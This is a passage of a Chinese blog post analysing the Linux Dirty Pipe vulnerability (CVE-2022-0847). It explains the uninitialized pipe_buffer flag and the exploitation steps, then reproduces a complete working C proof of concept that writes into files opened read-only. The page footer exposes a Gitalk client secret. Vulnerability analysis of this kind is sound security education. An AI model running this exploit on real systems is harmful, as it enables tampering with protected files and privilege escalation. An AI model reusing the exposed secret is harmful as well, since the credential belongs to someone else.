+<li>如果没文件缓存，则读取磁盘上的文件数据，创建新的文件缓存。</li>
+<li>如果有文件缓存但是缓存过期了，则更新这个文件缓存</li>
+</ul>
+</li>
+<li>到了这一步，此时是一定有文件缓存了。则调用 <strong>copy_page_to_iter</strong> 函数来将文件缓存页上的数据，拷贝进 pipe 中。</li>
+</ul>
+<p>这个函数正是我们先前所介绍过的，因此整个 splice 系统调用，就可以和 pipe 那里的未初始化漏洞串起来了。</p>
+<h2 id="四、漏洞成因">四、漏洞成因</h2>
+<p>这个漏洞并非一蹴而就，而是由两个 commit 的错误相互结合导致的：</p>
+<ul>
+<li>
+<p><a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b" target="_blank" rel="noopener">new iov_iter flavour: pipe-backed - linux commit 241699</a>：引入字段的未初始化漏洞。 <code>push_pipe</code> 和 <code>copy_page_to_iter_pipe</code> 两个函数在设置 <code>pipe_buffer</code> 结构体时均未初始化 flag 字段。</p>
+</li>
+<li>
+<p><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958" target="_blank" rel="noopener">pipe: merge anon_pipe_buf*_ops - linux commit f6dd97</a>：在该 commit 前，内核通过比较 <code>pipe_buf-&gt;ops</code> 的地址来判断两块 <code>pipe_buf</code> 是否是<strong>可合并</strong>的。<strong>这种编码并不优雅</strong>，因为无论是否可合并，<code>pipe_buf-&gt;ops</code> 实际指向的几个函数指针都是同一个：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/pipe.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">anon_pipe_buf_ops</span> = &#123;</span></span><br><span class="line">  .confirm = generic_pipe_buf_confirm,</span><br><span class="line">  .release = anon_pipe_buf_release,</span><br><span class="line">  .steal = anon_pipe_buf_steal,</span><br><span class="line">  .get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">anon_pipe_buf_nomerge_ops</span> = &#123;</span></span><br><span class="line">  .confirm = generic_pipe_buf_confirm,</span><br><span class="line">  .release = anon_pipe_buf_release,</span><br><span class="line">  .steal = anon_pipe_buf_steal,</span><br><span class="line">  .get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">packet_pipe_buf_ops</span> = &#123;</span></span><br><span class="line">  .confirm = generic_pipe_buf_confirm,</span><br><span class="line">  .release = anon_pipe_buf_release,</span><br><span class="line">  .steal = anon_pipe_buf_steal,</span><br><span class="line">  .get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看到，这么 tricky 的代码非常的不优雅，因此在该 commit(f6dd97) 中，linux 重构了这部分代码，启用了新的 pipe buf 标志：<code>PIPE_BUF_FLAG_CAN_MERGE</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01  <span class="comment">/* page is on the LRU */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02  <span class="comment">/* was atomically mapped */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04  <span class="comment">/* page is a gift */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08  <span class="comment">/* read() as a packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10  <span class="comment">/* can merge buffers */</span>     <span class="comment">// &lt;= 新引入的 flag</span></span></span><br></pre></td></tr></table></figure>
+<p>整个重构过程并没有问题，<strong>唯一带来的副作用就是引入了新的 pipe buf 标志：PIPE_BUF_FLAG_CAN_MERGE</strong>。</p>
+</li>
+</ul>
+<p>尽管第一个 commit 引入了字段未初始化漏洞，但该漏洞仍然无法造成较大的影响，因为<strong>可选的几个 pipe buf flag 中没有什么是可用于利用的</strong>。但是当第二个 commit 引入了新的 pipe buf flag：<code>PIPE_BUF_FLAG_CAN_MERGE</code> 时，该字段未初始化漏洞就非常的致命了，因为新的 pipe_buf 可以通过未初始化漏洞，来重用旧的 flag，例如 <code>PIPE_BUF_FLAG_CAN_MERGE</code>，来<strong>打破 page buf 的完整性</strong>，使得<strong>允许对那些本不该写入的页进行写入</strong>（例如本不该带有 PIPE_BUF_FLAG_CAN_MERGE 标志的页，诸如文件缓存页等等）。</p>
+<p>注意，这里说的<strong>只读页</strong>，在 pipe 中<strong>并非使用权限控制等技术来保证不写</strong>，而是<strong>通过 pipe 所实现的逻辑来保证</strong>。因此，当 pipe 实现的逻辑出现了问题，那么 pipe 就可以尝试写入只读页，进而达到任意文件写的目的。</p>
+<h2 id="五、漏洞利用">五、漏洞利用</h2>
+<p>通过上面的代码分析我们可以简单推断出这样的一条漏洞利用链：</p>
+<ol>
+<li>
+<p>创建管道（<strong>务必不要</strong>带上 O_DIRECT）</p>
+</li>
+<li>
+<p><strong>往管道中直接写入大量数据</strong>，使得 pipe 结构体中<strong>所有 page buf 的 flag 全部都设置了 PIPE_BUF_FLAG_CAN_MERGE 标志</strong>。</p>
+</li>
+<li>
+<p><strong>从该管道中将数据全部读取出来</strong>，释放所有 page buf。</p>
+</li>
+<li>
+<p>调用 splice，将<strong>数据长度不与页大小对齐</strong>的<strong>可读</strong>文件数据，传递至该管道中。这样在管道的 head 位置，势必会有一个 page buf，其中 <strong>page 指向文件缓存</strong>，<strong>flags 为 PIPE_BUF_FLAG_CAN_MERGE</strong>。</p>
+<blockquote>
+<p>因为 page buf 在重分配时不会初始化 flags，因此这里的 flags 将仍然保留为 PIPE_BUF_FLAG_CAN_MERGE。</p>
+</blockquote>
+</li>
+<li>
+<p>直接继续往该管道中写入<strong>目标数据</strong>，这样由于 PIPE_BUF_FLAG_CAN_MERGE 标志仍然存在，新写入的数据将会<strong>直接与 page buf 所指向的文件缓存合并</strong>。</p>
+</li>
+<li>
+<p>此时访问该文件，则<strong>内核会将被修改后的文件缓存中的数据返回</strong>，这样便可达到在内核层面任意文件写的目的。</p>
+</li>
+</ol>
+<blockquote>
+<p>需要注意的是，通过漏洞来“意外”修改文件缓存，<strong>不会使该文件缓存重新写回磁盘上</strong>。只有当内核的其他模块<strong>主动改写</strong>了这块文件缓存，使得该文件缓存<strong>变脏（dirty）</strong>，这样才会把被修改后的文件缓存保存回磁盘上。</p>
+<p>内核判断一个文件缓存是否 dirty，并非判断上面的数据有无被改写，而是判断其 dirty 标志。通过 dirty pipe 漏洞来改写文件缓存并不会影响到上面的 dirty 标志。</p>
+</blockquote>
+<p>介于 cm4all 那边已经给出了非常清晰易懂的 POC，因此这里直接贴出它的 POC：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all "bufs" on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">       the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">        write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">        r -= n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">       leaving the flags initialized) */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">        read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">        r -= n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">       pipe_buffer without initializing its "flags", the buffer</span></span><br><span class="line"><span class="comment">       will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s TARGETFILE OFFSET DATA\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Sorry, cannot start writing at a page boundary\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line">    <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Sorry, cannot write across a page boundary\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">        perror(<span class="string">"stat failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Offset is not inside the file\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Sorry, cannot enlarge the file\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">       PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">       pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">       since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">    --offset;</span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"splice failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short splice\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">       will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">       PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">    nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"write failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short write\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"It worked!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<p><img src="/2022/04/dirty-pipe/image-20220403152547117.png" alt="image-20220403152547117"></p>
+<p>可以看到运行的非常顺利，成功在<strong>只读打开</strong>该文件的情况下，完成对该文件的<strong>写入</strong>。</p>
+<h2 id="七、参考">七、参考</h2>
+<ul>
+<li><a href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener">The Dirty Pipe Vulnerability - cm4all</a></li>
+<li><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit" target="_blank" rel="noopener">CVE-2022-0847-DirtyPipe-Exploit - github</a></li>
+<li>linux github commits
+<ul>
+<li><a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b" target="_blank" rel="noopener">new iov_iter flavour: pipe-backed - linux commit</a></li>
+<li><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958" target="_blank" rel="noopener">pipe: merge anon_pipe_buf*_ops - linux commit</a></li>
+<li><a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903" target="_blank" rel="noopener">lib/iov_iter: initialize “flags” in new pipe_buffer - linux commit</a></li>
+</ul>
+</li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/04/dirty-pipe/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/08/thread_canary/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            浅析 Linux 程序的 Canary 机制
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/03/syzkaller-1/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">syzkaller 源码阅读笔记-1</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
